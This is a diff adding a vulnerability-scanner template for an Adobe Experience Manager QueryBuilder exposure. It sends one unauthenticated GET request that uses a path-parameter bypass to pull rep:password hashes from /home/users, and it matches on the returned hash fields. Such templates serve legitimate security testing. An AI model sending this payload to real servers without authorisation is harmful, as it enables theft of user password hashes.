@@ -1,0 +1,27 @@
+id: aem-querybuilder-bypass
+brief:
+    title: AEM QueryBuilder JSON Exposure - Bypass
+    by: tess
+    level: critical
+    about: Adobe Experience Manager QueryBuilder endpoint allows unauthenticated attackers to extract sensitive user repository data, including password hashes from the rep:password field in /home/users. This...
+    label:
+        - aem
+        - adobe
+        - exposure
+        - querybuilder
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/bin/querybuilder.json;x=''x/graphql/execute/json/x''?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3'
+      signs:
+        - "on": word
+          has:
+            - '"rep:password"'
+            - '"success":true'
+            - '"results":'
+            - '"hits":'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
